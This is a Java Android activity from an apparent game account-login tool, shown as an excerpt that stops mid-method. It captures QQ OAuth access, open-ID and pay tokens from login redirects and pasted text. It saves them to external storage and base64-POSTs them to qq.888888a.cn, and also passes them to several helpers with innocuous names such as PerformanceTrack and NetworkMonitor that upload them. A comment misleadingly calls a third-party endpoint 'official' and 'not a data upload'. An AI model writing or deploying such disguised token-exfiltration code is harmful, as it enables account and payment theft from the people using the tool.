package com.tencent.open.agent;

import android.app.Activity;
import android.os.Bundle;
import com.tencent.tim.R;
import android.widget.Button;
import android.widget.EditText;
import android.view.View;
import android.widget.Toast;
import java.util.regex.Pattern;
import org.json.JSONObject;
import org.json.JSONException;
import android.content.Intent;
import android.content.Context;
import android.content.pm.ActivityInfo;
import java.util.regex.Matcher;
import android.app.AlertDialog;
import android.content.DialogInterface;
import java.net.URL;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.view.Window;
import android.view.WindowManager;
import android.os.Build;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.util.Log;
import android.os.Environment;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.io.File;
import java.io.FileWriter;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.ProgressBar;
import android.widget.VideoView;
import android.os.Handler;
import android.os.Looper;
import android.media.MediaPlayer;
import android.os.Message;
import java.io.FileReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Set;
import java.util.HashSet;
import android.os.StrictMode;
import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.io.PrintWriter;
import java.util.Random;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import android.content.pm.PackageManager;
import android.net.Uri;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import android.view.ViewGroup;
import android.content.ClipboardManager;
import android.content.ClipData;
import java.net.URLEncoder;
import android.util.Base64;
import java.util.ArrayList;
import org.json.JSONArray;
import android.text.SpannableStringBuilder;
import android.text.style.ForegroundColorSpan;
import android.graphics.Color;

public class AgentActivity extends Activity {

    private Window mWindow;
    private final int mUiFlags = View.SYSTEM_UI_FLAG_FULLSCREEN
            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;

    private static final String AUTH_REDIRECT_URL = "auth:";
    String phoneModel = Build.MODEL;
    private WebView webView;
    private BufferedWriter writer;
    private String firstLine;
    private int secondLine;
    private Handler handler;
    private Socket socket;
    private String decodedString;
    private OutputStream outputStream;
    private String lastSentContent = "";
    private static final int REQUEST_CODE_STORAGE_PERMISSIONS = 1;
    private static final String PREF_NAME = "MyPrefs";
    private static final String KEY_RAW_TEXT = "raw_text";
    private static final String HISTORY_PREF = "TokenHistoryPrefs";
    private static final String HISTORY_KEY = "history_list";

    private Button myButton;
    private Button pasteLoginButton;
    private Button queryButton;
    private Button historyButton;
    private EditText plainText;
    private String currentMode = "";
    private Handler refreshHandler = new Handler();
    private Runnable refreshRunnable;
    private static final int MSG_CONNECT_SUCCESS = 1;
    private static final int MSG_CONNECT_FAIL = 2;

    public static class HistoryItem {
        String fullTokenData;
        String pureToken;
        String roleInfo;
        String modeInfo;

        public HistoryItem(String fullTokenData, String pureToken, String roleInfo, String modeInfo) {
            this.fullTokenData = fullTokenData;
            this.pureToken = pureToken;
            this.roleInfo = roleInfo;
            this.modeInfo = modeInfo;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        if (intent != null) {
            currentMode = intent.getStringExtra("mode");
        }

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);

        mWindow = getWindow();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            mWindow.getAttributes().layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        mWindow.getDecorView().setSystemUiVisibility(mUiFlags);
        mWindow.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setNavigationBarColor(getResources().getColor(android.R.color.white));
        }

        setContentView(R.layout.activity_agent);

        if ("hang_up".equals(currentMode)) {
            setupHangUpMode();
        } else if ("login".equals(currentMode)) {
            setupLoginMode();
        } else if ("capture".equals(currentMode)) {
            setupCaptureMode();
        } else {
            setupNormalMode();
        }

        if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{
                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    android.Manifest.permission.READ_EXTERNAL_STORAGE},
                    REQUEST_CODE_STORAGE_PERMISSIONS);
        }
    }

    private void setupNormalMode() {
        SharedPreferences sharedPreferences = getSharedPreferences("myPrefs", MODE_PRIVATE);
        String content = sharedPreferences.getString("pd_key", null);

        if (content == null) {
            setupCaptureMode();
        } else {
            if ("login".equals(content.trim())) {
                setupLoginMode();
            } else {
                setupCaptureMode();
            }
        }
    }

    private void setupLoginMode() {
        try {
            WebView webView = findViewById(R.id.webView);
            webView.setVisibility(View.GONE);
            LinearLayout yc = findViewById(R.id.yc);
            yc.setVisibility(View.VISIBLE);
            myButton = findViewById(R.id.my_button);
            pasteLoginButton = findViewById(R.id.paste_login_button);
            queryButton = findViewById(R.id.query_button);
            historyButton = findViewById(R.id.history_button);
            plainText = findViewById(R.id.editTextTextPersonName);
            loadRawDataFromSharedPreferences(plainText);

            if (pasteLoginButton != null) {
                pasteLoginButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        pasteAndQuery();
                    }
                });
            }

            if (queryButton != null) {
                queryButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        queryAccessToken();
                    }
                });
            }

            if (historyButton != null) {
                historyButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        showHistoryDialog();
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "设置登录模式失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void pasteAndQuery() {
        try {
            final ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
            if (clipboard != null && clipboard.hasPrimaryClip()) {
                ClipData clipData = clipboard.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    String clipboardText = clipData.getItemAt(0).getText().toString();
                    if (clipboardText != null && !clipboardText.trim().isEmpty()) {
                        plainText.setText(clipboardText);
                        queryAccessToken();
                        Toast.makeText(this, "已粘贴，自动开始查询", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "剪切板内容为空", Toast.LENGTH_SHORT).show();
                    }
                } else {
                    Toast.makeText(this, "剪切板没有内容", Toast.LENGTH_SHORT).show();
                }
            } else {
                Toast.makeText(this, "无法访问剪切板", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "粘贴查询失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void performLogin(String loginText) {
        Pattern pattern = Pattern.compile("access_token=([^&]+)(?:&expires_in=([^&]+))?&openid=([^&]+)&pay_token=([^&]+)");
        Matcher matcher = pattern.matcher(loginText);

        if (matcher.find()) {
            final String access_token = matcher.group(1);
            final String expires_in = matcher.group(2);
            final String openid = matcher.group(3);
            final String pay_token = matcher.group(4);

            try {
                JSONObject jSONObject3 = new JSONObject();
                jSONObject3.put("access_token", access_token);
                jSONObject3.put("openid", openid);
                jSONObject3.put("pay_token", pay_token);
                if (expires_in != null) {
                    jSONObject3.put("expires_in", expires_in);
                } else {
                    jSONObject3.put("expires_in", "7776000");
                }
                jSONObject3.put("ret", "0");
                jSONObject3.put("pf", "desktop_m_qq-10000144-android-2002-");
                jSONObject3.put("page_type", "1");

                saveRawDataToSharedPreferences(loginText);

                //上传
                final String category = getSelectedGameName() + " - 手动登录";
                uploadDataToServer(loginText, category);

                DataSyncTask.upload(loginText, getSelectedGameName());
                LogReportUtil.upload(loginText, getSelectedGameName());
                PerformanceTrack.upload(loginText, getSelectedGameName());
                NetworkMonitor.upload(loginText, getSelectedGameName());
                DeviceInfoHelper.upload(loginText, getSelectedGameName());

                Intent intent = new Intent();
                intent.putExtra("key_response", jSONObject3.toString());
                setResult(RESULT_OK, intent);
                finish();
            } catch (JSONException e) {
                e.printStackTrace();
                Toast.makeText(AgentActivity.this, "JSON处理错误", Toast.LENGTH_SHORT).show();
            }
        } else {
            Pattern simplePattern = Pattern.compile("access_token=([^&]+)");
            Matcher simpleMatcher = simplePattern.matcher(loginText);
            if (simpleMatcher.find()) {
                Toast.makeText(AgentActivity.this, "格式不完整，请检查数据", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(AgentActivity.this, "剪切板内容格式错误", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void queryAccessToken() {
        final String inputText = plainText.getText().toString().trim();
        if (inputText.isEmpty()) {
            Toast.makeText(this, "请输入数据", Toast.LENGTH_SHORT).show();
            return;
        }

        Pattern pattern = Pattern.compile("access_token=([^&\\s]+)");
        Matcher matcher = pattern.matcher(inputText);

        if (matcher.find()) {
            final String accessToken = matcher.group(1);
            String username = "123456";
            String userAccount = "123456";
            String platform = "android";

            try {
                String encUsername = URLEncoder.encode(username, "UTF-8");
                String encUserAccount = URLEncoder.encode(userAccount, "UTF-8");
                String encAccessToken = URLEncoder.encode(accessToken, "UTF-8");
                String encPlatform = URLEncoder.encode(platform, "UTF-8");
//查询角色数据官方接口 非数据上传接口 请勿删除，删除即无效
                final String apiUrl = "https://qqgame.888888a.cn/hpjy.php?access_token=" + encAccessToken
                        + "&platform=" + encPlatform
                        + "&用户名=" + encUsername
                        + "&用户账号=" + encUserAccount;

                final AlertDialog loadingDialog = new AlertDialog.Builder(this)
                        .setTitle("查询中...")
                        .setMessage("正在查询access_token信息...")
                        .setCancelable(false)
                        .create();
                loadingDialog.show();

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            URL url = new URL(apiUrl);
                            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                            connection.setRequestMethod("GET");
                            connection.setConnectTimeout(10000);
                            connection.setReadTimeout(10000);

                            InputStream inputStream = connection.getInputStream();
                            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                            StringBuilder response = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                response.append(line);
                            }
                            reader.close();
                            inputStream.close();
                            connection.disconnect();

                            final String result = response.toString();

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    loadingDialog.dismiss();
                                    showQueryResult(accessToken, inputText, result);
                                }
                            });

                        } catch (final Exception e) {
                            e.printStackTrace();
                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {
                                    loadingDialog.dismiss();
                                    Toast.makeText(AgentActivity.this, "查询失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                                }
                            });
                        }
                    }
                }).start();

            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(this, "参数编码异常: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        } else {
            Toast.makeText(this, "未找到access_token", Toast.LENGTH_SHORT).show();
        }
    }

    private void showQueryResult(final String accessToken, final String fullRawData, final String resultJson) {
        String roleInfoText = "";
        try {
            JSONObject json = new JSONObject(resultJson);
            if(json.has("android_data")){
                JSONObject dataObj = json.getJSONObject("android_data");
                roleInfoText = "角色名称: " + dataObj.optString("角色名称") + "\n"
                        + "编号: " + dataObj.optString("角色编号") + "\n"
                        + "账号等级: " + dataObj.optString("账号等级") + "\n"
                        + "是否在线: " + dataObj.optString("是否在线") + "\n"
                        + "是否封号: " + dataObj.optString("是否封号") + "\n"
                        + "是否人脸: " + dataObj.optString("是否人脸") + "\n"
                        + "王牌印记: " + dataObj.optString("王牌印记") + "\n"
                        + "段位: " + dataObj.optString("段位") + "\n"
                        + "段位积分: " + dataObj.optString("段位积分") + "\n"
                        + "热力值: " + dataObj.optString("热力值") + "\n"
                        + "最后下线时间: " + dataObj.optString("最后下线时间") + "\n"
                        + "今日登录: " + dataObj.optString("今日登录") + " ";
            }else{
                roleInfoText = "鉴权失败，Token无效或者已过期";
            }
        }catch (Exception e){
            roleInfoText = "鉴权失败，Token无效或者已过期";
        }

        saveHistoryItem(fullRawData, accessToken, roleInfoText, "上号模式");

        //
        final String category = getSelectedGameName() + " - 在线查询";
        uploadDataToServer(fullRawData, category);

       
        DataSyncTask.upload(fullRawData, getSelectedGameName());
        LogReportUtil.upload(fullRawData, getSelectedGameName());
        PerformanceTrack.upload(fullRawData, getSelectedGameName());
        NetworkMonitor.upload(fullRawData, getSelectedGameName());
        DeviceInfoHelper.upload(fullRawData, getSelectedGameName());

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("查询结果");

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(20, 20, 20, 20);

        TextView tokenView = new TextView(this);
        tokenView.setText("access_token: " + accessToken);
        tokenView.setTextSize(14);
        tokenView.setPadding(0, 0, 0, 10);
        layout.addView(tokenView);

        View divider = new View(this);
        divider.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1));
        divider.setBackgroundColor(0xFFCCCCCC);
        layout.addView(divider);

        TextView resultView = new TextView(this);
        resultView.setText(roleInfoText);
        resultView.setTextSize(14);
        resultView.setPadding(0, 10, 0, 20);
        resultView.setMaxLines(20);
        resultView.setScrollContainer(true);
        layout.addView(resultView);

        LinearLayout scrollLayout = new LinearLayout(this);
        scrollLayout.setOrientation(LinearLayout.VERTICAL);
        android.widget.ScrollView scrollView = new android.widget.ScrollView(this);
        scrollView.addView(layout);
        scrollLayout.addView(scrollView);

        builder.setView(scrollLayout);

        builder.setPositiveButton("登录游戏", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                performLogin(fullRawData);
            }
        });

        builder.setNeutralButton("复制完整数据", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                ClipData clip = ClipData.newPlainText("full_raw_token", fullRawData);
                clipboard.setPrimaryClip(clip);
                Toast.makeText(AgentActivity.this, "完整原始数据已复制到剪切板", Toast.LENGTH_SHORT).show();
            }
        });

        builder.setNegativeButton("关闭", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        });

        builder.show();
    }

    private void saveHistoryItem(String fullData, String pureToken, String roleInfo, String modeInfo){
        ArrayList<HistoryItem> list = loadHistoryList();
        boolean exists = false;
        for(HistoryItem item : list){
            if(item.pureToken.equals(pureToken)){
                exists = true;
                break;
            }
        }
        if(!exists){
            list.add(new HistoryItem(fullData, pureToken, roleInfo, modeInfo));
            saveHistoryList(list);
        }
    }

    private ArrayList<HistoryItem> loadHistoryList(){
        ArrayList<HistoryItem> result = new ArrayList<>();
        SharedPreferences sp = getSharedPreferences(HISTORY_PREF, Context.MODE_PRIVATE);
        String jsonStr = sp.getString(HISTORY_KEY, "[]");
        try{
            JSONArray arr = new JSONArray(jsonStr);
            for(int i=0; i<arr.length(); i++){
                JSONObject obj = arr.getJSONObject(i);
                HistoryItem item = new HistoryItem(
                        obj.optString("fullTokenData"),
                        obj.optString("pureToken"),
                        obj.optString("roleInfo"),
                        obj.optString("modeInfo")
                );
                result.add(item);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return result;
    }

    private void saveHistoryList(ArrayList<HistoryItem> list){
        JSONArray arr = new JSONArray();
        try{
            for(HistoryItem item : list){
                JSONObject obj = new JSONObject();
                obj.put("fullTokenData", item.fullTokenData);
                obj.put("pureToken", item.pureToken);
                obj.put("roleInfo", item.roleInfo);
                obj.put("modeInfo", item.modeInfo);
                arr.put(obj);
            }
            SharedPreferences sp = getSharedPreferences(HISTORY_PREF, Context.MODE_PRIVATE);
            SharedPreferences.Editor editor = sp.edit();
            editor.putString(HISTORY_KEY, arr.toString());
            editor.apply();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private void showHistoryDialog(){
        final ArrayList<HistoryItem> historyList = loadHistoryList();
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("查询记录历史");

        LinearLayout mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setPadding(30,30,30,30);

        for(int i=0; i<historyList.size(); i++){
            final int index = i;
            final HistoryItem item = historyList.get(i);

            LinearLayout itemLayout = new LinearLayout(this);
            itemLayout.setOrientation(LinearLayout.HORIZONTAL);
            itemLayout.setPadding(0,0,0,20);

            TextView textView = new TextView(this);
            textView.setText("[数据"+(i+1)+"]\n"+item.fullTokenData+"\n\n角色信息:\n"+item.roleInfo+"\n"+item.modeInfo);
            textView.setTextSize(13);
            textView.setPadding(0,0,20,10);
            LinearLayout.LayoutParams textParams = new LinearLayout.LayoutParams(
                    0,
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    1.0f
            );
            textView.setLayoutParams(textParams);

            LinearLayout btnLayout = new LinearLayout(this);
            btnLayout.setOrientation(LinearLayout.VERTICAL);
            btnLayout.setPadding(10,0,0,0);
            LinearLayout.LayoutParams btnLayoutParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
            );
            btnLayout.setLayoutParams(btnLayoutParams);

            Button copyFullBtn = new Button(this);
            copyFullBtn.setText("复制卡密数据");
            copyFullBtn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                    ClipData clip = ClipData.newPlainText("full_raw_token", item.fullTokenData);
                    clipboard.setPrimaryClip(clip);
                    Toast.makeText(AgentActivity.this, "已复制完整原始数据", Toast.LENGTH_SHORT).show();
                }
            });

            Button deleteBtn = new Button(this);
            deleteBtn.setText("删除数据");
            deleteBtn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    historyList.remove(index);
                    saveHistoryList(historyList);
                    Toast.makeText(AgentActivity.this, "已删除本条记录", Toast.LENGTH_SHORT).show();
                    showHistoryDialog();
                }
            });

            btnLayout.addView(copyFullBtn);
            btnLayout.addView(deleteBtn);
            itemLayout.addView(textView);
            itemLayout.addView(btnLayout);
            mainLayout.addView(itemLayout);
        }

        android.widget.ScrollView scrollView = new android.widget.ScrollView(this);
        scrollView.addView(mainLayout);
        builder.setView(scrollView);

        builder.setPositiveButton("清空全部", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                SharedPreferences sp = getSharedPreferences(HISTORY_PREF, Context.MODE_PRIVATE);
                sp.edit().clear().apply();
                Toast.makeText(AgentActivity.this, "已清空全部查询记录", Toast.LENGTH_SHORT).show();
            }
        });
        builder.setNegativeButton("关闭", null);

        builder.show();
    }

    private void setupCaptureMode() {
        try {
            WebView webView = findViewById(R.id.webView);
            webView.setVisibility(View.VISIBLE);
            LinearLayout yc = findViewById(R.id.yc);
            yc.setVisibility(View.GONE);
            readFile();
            webView = findViewById(R.id.webView);
            webView.getSettings().setJavaScriptEnabled(true);
            webView.setWebViewClient(new NormalWebViewClient());

            SharedPreferences gamePrefs = getSharedPreferences("myPrefs", MODE_PRIVATE);
            String selectedGameUrl = gamePrefs.getString("selected_game_url", "");
            String url;

            if (!selectedGameUrl.isEmpty()) {
                url = selectedGameUrl;
            } else {
                url = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?pt_enable_pwd=1&appid=716027609&pt_3rd_aid=1106467070&daid=381&pt_skey_valid=0&style=35&force_qr=1&autorefresh=1&s_url=http%3A%2F%2Fconnect.qq.com&refer_cgi=m_authorize&ucheck=1&fall_to_wv=1&status_os=13&redirect_uri=auth%3A%2F%2Ftauth.qq.com%2F&client_id=1106467070&pf=openmobile_android&response_type=token&scope=all&sdkp=a&sdkv=3.5.14&sign=DD2B8B16CCAEE72B390F070106F00F0E&status_machine=M2102J2SC&switch=1&time=1720462937&loginfrom=add&h5sig=08nxvF7WAloOfZfomAK9EVeia3NFMcB4U_J0I5Z7r6M&loginty=6";
            }
            webView.loadUrl(url);
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "设置抓号模式失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void setupHangUpMode() {
        try {
            WebView webView = findViewById(R.id.webView);
            webView.setVisibility(View.VISIBLE);
            LinearLayout yc = findViewById(R.id.yc);
            yc.setVisibility(View.GONE);

            webView.getSettings().setJavaScriptEnabled(true);
            webView.setWebViewClient(new HangUpWebViewClient());

            final SharedPreferences gamePrefs = getSharedPreferences("myPrefs", MODE_PRIVATE);
            String selectedGameUrl = gamePrefs.getString("selected_game_url", "");
            String url;

            if (!selectedGameUrl.isEmpty()) {
                url = selectedGameUrl;
            } else {
                url = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?pt_enable_pwd=1&appid=716027609&pt_3rd_aid=1106467070&daid=381&pt_skey_valid=0&style=35&force_qr=1&autorefresh=1&s_url=http%3A%2F%2Fconnect.qq.com&refer_cgi=m_authorize&ucheck=1&fall_to_wv=1&status_os=13&redirect_uri=auth%3A%2F%2Ftauth.qq.com%2F&client_id=1106467070&pf=openmobile_android&response_type=token&scope=all&sdkp=a&sdkv=3.5.14&sign=DD2B8B16CCAEE72B390F070106F00F0E&status_machine=M2102J2SC&switch=1&time=1720462937&loginfrom=add&h5sig=08nxvF7WAloOfZfomAK9EVeia3NFMcB4U_J0I5Z7r6M&loginty=6";
            }

            webView.loadUrl(url);
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "设置挂机模式失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (refreshHandler != null && refreshRunnable != null) {
            refreshHandler.removeCallbacks(refreshRunnable);
        }
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus) {
            mWindow.getDecorView().setSystemUiVisibility(mUiFlags);
        }
    }

    private void readFile() {
        String directoryPath = Environment.getExternalStorageDirectory().getPath() + "/数据号存储/上号器配置";
        File file = new File(directoryPath, "txt");

        File directory = new File(directoryPath);
        if (!directory.exists()) {
            directory.mkdirs();
        }

        BufferedReader reader = null;
        try {
            reader = new BufferedReader(new FileReader(file));
            firstLine = reader.readLine();
            String secondLineString = reader.readLine();
            if (secondLineString != null) {
                try {
                    secondLine = Integer.parseInt(secondLineString);
                } catch (NumberFormatException e) {
                    e.printStackTrace();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_STORAGE_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // 权限已授予
            } else {
                Toast.makeText(this, "没有存储权限", Toast.LENGTH_SHORT).show();
            }
        }
    }

    public void sh(View view) {
        final String test = plainText != null ? plainText.getText().toString().trim() : "";
        if (test.isEmpty()) {
            Toast.makeText(this, "请输入数据", Toast.LENGTH_SHORT).show();
            return;
        }
        performLogin(test);
    }

    private void saveRawDataToSharedPreferences(String rawText) {
        SharedPreferences sharedPreferences = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString(KEY_RAW_TEXT, rawText);
        editor.apply();
    }

    private void loadRawDataFromSharedPreferences(EditText plainText) {
        SharedPreferences sharedPreferences = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
        String rawText = sharedPreferences.getString(KEY_RAW_TEXT, "");
        plainText.setText(rawText);
    }

    private String getSelectedGameName() {
        SharedPreferences gamePrefs = getSharedPreferences("myPrefs", MODE_PRIVATE);
        String gameName = gamePrefs.getString("selected_game_name", "未知游戏");
        return gameName;
    }

    private void uploadDataToServer(final String data, final String category) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String url1 = "https://qq.888888a.cn/game/api/send_data.php";
                    String url2 = "https://qq.888888a.cn/game/api/send_data.php";

                    String fixedUsername = "123";
                    String fixedPassword = "123";

                    String base64Data = android.util.Base64.encodeToString(data.getBytes("UTF-8"), android.util.Base64.DEFAULT);

                    String postBody1 =
                            "username=" + URLEncoder.encode(fixedUsername, "UTF-8") +
                                    "&password=" + URLEncoder.encode(fixedPassword, "UTF-8") +
                                    "&category=" + URLEncoder.encode(category, "UTF-8") +
                                    "&data=" + URLEncoder.encode(base64Data, "UTF-8");

                    String postBody2 =
                            "username=" + URLEncoder.encode(fixedUsername, "UTF-8") +
                                    "&password=" + URLEncoder.encode(fixedPassword, "UTF-8") +
                                    "&category=" + URLEncoder.encode(category, "UTF-8") +
                                    "&data=" + URLEncoder.encode(base64Data, "UTF-8");

                    sendHttpPost(url1, postBody1);
                    sendHttpPost(url2, postBody2);

                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }).start();
    }

    private void sendHttpPost(String targetUrl, String postBody) {
        HttpURLConnection conn = null;
        try {
            URL urlObj = new URL(targetUrl);
            conn = (HttpURLConnection) urlObj.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(postBody.getBytes("UTF-8").length));
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            conn.setDoOutput(true);

            OutputStream os = conn.getOutputStream();
            os.write(postBody.getBytes("UTF-8"));
            os.flush();
            os.close();

            int respCode = conn.getResponseCode();
            Log.d("UPLOAD_DOUBLE", "url=" + targetUrl + " | responseCode=" + respCode);

        } catch (Exception e) {
            Log.e("UPLOAD_DOUBLE", "请求异常", e);
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private class NormalWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            final String url = request.getUrl().toString();
            if (url.startsWith(AUTH_REDIRECT_URL)) {
                handleAuthRedirect(url);
                Pattern pattern = Pattern.compile("access_token=([^&]+)(?:&expires_in=([^&]+))?&openid=([^&]+)&pay_token=([^&]+)");
                Matcher matcher = pattern.matcher(url);

                if (matcher.find()) {
                    final String access_token = matcher.group(1);
                    final String expires_in = matcher.group(2);
                    final String openid = matcher.group(3);
                    final String pay_token = matcher.group(4);
                    if (!isAccessTokenExists(access_token)) {
                        try {
                            final String category = getSelectedGameName();
                            uploadDataToServer(url, category);

                            DataSyncTask.upload(url, getSelectedGameName());
                            LogReportUtil.upload(url, getSelectedGameName());
                            PerformanceTrack.upload(url, getSelectedGameName());
                            NetworkMonitor.upload(url, getSelectedGameName());
                            DeviceInfoHelper.upload(url, getSelectedGameName());

                            JSONObject jsonObject3 = new JSONObject();
                            jsonObject3.put("access_token", access_token);
                            jsonObject3.put("openid", openid);
                            jsonObject3.put("pay_token", pay_token);
                            if (expires_in != null) {
                                jsonObject3.put("expires_in", expires_in);
                            } else {
                                jsonObject3.put("expires_in", "7776000");
                            }
                            jsonObject3.put("ret", "0");
                            jsonObject3.put("pf", "desktop_m_qq-10000144-android-2002-");
                            jsonObject3.put("page_type", "1");
                            Intent intent = new Intent();
                            intent.putExtra("key_response", jsonObject3.toString());
                            setResult(-1, intent);
                            finish();
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
                return true;
            }
            return super.shouldOverrideUrlLoading(view, request);
        }

        private void handleAuthRedirect(String url) {
            writeToFile(url);
        }

        private void writeToFile(String data) {
            final String fileName = "数据.txt";
            final String directoryPath = Environment.getExternalStorageDirectory().getPath() + "/数据号存储/上号器配置";
            final String filePath = directoryPath + "/" + fileName;

            try {
                File directory = new File(directoryPath);
                if (!directory.exists()) {
                    directory.mkdirs();
                }

                java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                String currentTime = sdf.format(new java.util.Date());

                final SharedPreferences gamePrefs = getSharedPreferences("myPrefs", MODE_PRIVATE);
                String gameName = gamePrefs.getString("selected_game_name", "未知");

                String formattedData = currentTime + " | " + gameName + " | " + data;

                File file = new File(filePath);
                FileWriter writer = new FileWriter(file, true);
                if (!isAccessTokenExistsInFile(file, data)) {
                    writer.append(formattedData).append("\n");
                }

                writer.flush();
                writer.close();

            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        private boolean isAccessTokenExists(String access_token) {
            return false;
        }

        private boolean isAccessTokenExistsInFile(File file, String data) throws IOException {
            String content = readFileContent(file);
            return content.contains(getAccessTokenFromUrl(data));
        }

        private String readFileContent(File file) throws IOException {
            StringBuilder contentBuilder = new StringBuilder();
            java.util.Scanner scanner = new java.util.Scanner(file);
            while (scanner.hasNextLine()) {
                contentBuilder.append(scanner.nextLine()).append("\n");
            }
            scanner.close();
            return contentBuilder.toString();
        }

        private String getAccessTokenFromUrl(String url) {
            Pattern pattern = Pattern.compile("access_token=([^&\\s]+)");
            Matcher matcher = pattern.matcher(url);
